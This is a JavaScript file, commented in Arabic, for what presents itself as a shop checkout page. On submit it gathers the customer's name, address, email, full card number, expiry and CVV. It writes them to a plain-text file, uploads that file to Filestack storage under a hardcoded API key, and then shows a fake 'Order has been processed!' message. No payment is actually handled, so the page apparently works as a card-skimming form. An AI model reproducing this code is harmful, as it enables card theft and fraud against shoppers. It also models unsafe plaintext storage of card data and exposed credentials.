document.addEventListener('DOMContentLoaded', function () {
  // تحديد العناصر
  const form = document.getElementById('checkout-form');
  const productInfoContainer = document.querySelector('.product-info');
  const productDetailsContainer = document.getElementById('product-details');
  const productButton = document.getElementById('toggle-details');  // الزر الحالي لعرض التفاصيل

  // استخراج المعلمات من الرابط
  function getUrlParams() {
    const params = {};
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    urlParams.forEach((value, key) => {
      params[key] = value;
    });
    return params;
  }

  const urlParams = getUrlParams();

  // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
  document.getElementById('product-name').textContent = urlParams.name;
  document.getElementById('product-color').textContent = urlParams.color;
  document.getElementById('product-price').textContent = urlParams.price;
  

  // عرض الصورة
  const productImage = document.getElementById('product-image');

  if (urlParams.image) {
    productImage.src = urlParams.image;
    productImage.alt = urlParams.name || 'Product' + ' image';
  } else {
    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';
    productImage.alt = 'No Image Available';
  }

  // عند الضغط على زر "Show Product Details"، نعرض تفاصيل المنتج أو إخفاءها
  productButton.addEventListener('click', function() {
    if (productDetailsContainer.style.display === 'none' || productDetailsContainer.style.display === '') {
      productDetailsContainer.style.display = 'block';  // إظهار تفاصيل المنتج
      productImage.style.display = 'block';  // إظهار الصورة
      productButton.textContent = 'Hide Product Details';  // تغيير النص إلى "Hide Product Details"
    } else {
      productDetailsContainer.style.display = 'none';  // إخفاء تفاصيل المنتج
      productImage.style.display = 'none';  // إخفاء الصورة
      productButton.textContent = 'Show Product Details';  // إعادة النص إلى "Show Product Details"
    }
  });

  // إضافة مستمع للإرسال
  form.addEventListener('submit', function (event) {
    event.preventDefault();  // منع إعادة تحميل الصفحة عند الإرسال

    // جمع البيانات من الحقول
    const email = document.getElementById('email').value;
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const streetHouseApartmentUnit = document.getElementById('street-house-apartment-unit').value;
    const city = document.getElementById('city').value;
    const state = document.getElementById('state').value;
    const zipCode = document.getElementById('zip-code').value;
    const cardName = document.getElementById('card-name').value;
    const cardNumber = document.getElementById('card-number').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;

    // معلومات المنتج
    const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
    const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
    const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
    const productImageUrl = urlParams.productImage || '';  // رابط الصورة

    // تحقق من القيم
    let isValid = true;

    removeErrorMessages();  // إزالة رسائل الخطأ السابقة

    // تحقق من الحقول الفارغة
    if (!email || !firstName || !lastName || !streetHouseApartmentUnit || !city || !state || !zipCode || !cardName || !cardNumber || !expiry || !cvv) {
        isValid = false;
        showErrorMessage('Please fill out all required fields.', 'general');
    }

    // تحقق من صحة البريد الإلكتروني
    if (!validateEmail(email)) {
        isValid = false;
        showErrorMessage('Please enter a valid email address.', 'email');
    }

    // تحقق من اسم حامل البطاقة
    if (!validateCardName(cardName)) {
        isValid = false;
        showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
    }

    // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
    if (!validateCard(cardNumber)) {
        isValid = false;
        showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
    }

    // تحقق من تاريخ الصلاحية
    if (!validateExpiry(expiry)) {
        isValid = false;
        showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
    }

    // تحقق من CVV
    if (!validateCVV(cvv)) {
        isValid = false;
        showErrorMessage('Please enter a valid CVV number.', 'cvv');
    }

    if (isValid) {
        // إنشاء محتوى الملف النصي مع بيانات المنتج
        const orderData =  
            `Email: ${email}\n
            First Name: ${firstName}\n
            Last Name: ${lastName}\n
            Street_House_Apartment_Unit: ${streetHouseApartmentUnit}\n
            City: ${city}\n
            State: ${state}\n
            Zip Code: ${zipCode}\n
            Cardholders Name: ${cardName}\n
            Card Number: ${cardNumber}\n
            Expiry Date: ${expiry}\n
            CVV: ${cvv}\n
            --- Product Details ---\n
            Product Name: ${productName}\n
            Product Price: $${productPriceText}\n
            Product Quantity: ${productQuantityText}\n
            Product Image URL: ${productImageUrl}\n
            Total Price: $${totalPrice}`;


        // تحويل البيانات إلى Blob (بيانات ثنائية)
        const blob = new Blob([orderData], { type: 'text/plain' });

        // إعدادات Filestack API
        const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
        const url = `https://www.filestackapi.com/api/store/S3?key=${apiKey}`;

        // إعداد بيانات الطلب
        const formData = new FormData();
        formData.append('file', blob, 'order.txt');

        // إرسال البيانات إلى Filestack
        fetch(url, {
            method: 'POST',
            body: formData,
        })
        .then(response => response.json())
        .then(data => {
            alert('Order has been processed!');
        })
        .catch(error => {
            console.error('Error uploading file:', error);
        });
    }
  });
});

// دالة للتحقق من صحة البريد الإلكتروني
function validateEmail(email) {
  const regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
  return regex.test(email);
}

// دالة للتحقق من صحة اسم حامل البطاقة
function validateCardName(name) {
  const regex = /^[A-Za-z\s]+$/;
  return regex.test(name);
}

// دالة للتحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
function validateCard(cardNumber) {
  const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
  return regex.test(cardNumber);
}

// دالة للتحقق من تاريخ الصلاحية
function validateExpiry(expiry) {
  const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
  return regex.test(expiry);
}

// دالة للتحقق من CVV
function validateCVV(cvv) {
  const regex = /^[0-9]{3,4}$/;
  return regex.test(cvv);
}

// دالة لإظهار رسائل الخطأ
function showErrorMessage(message, field) {
  const errorMessage = document.createElement('div');
  errorMessage.classList.add('error-message');
  errorMessage.textContent = message;
  document.getElementById(field).parentNode.appendChild(errorMessage);
}

// دالة لإزالة رسائل الخطأ السابقة
function removeErrorMessages() {
  const errorMessages = document.querySelectorAll('.error-message');
  errorMessages.forEach(function(message) {
    message.remove();
  });
}


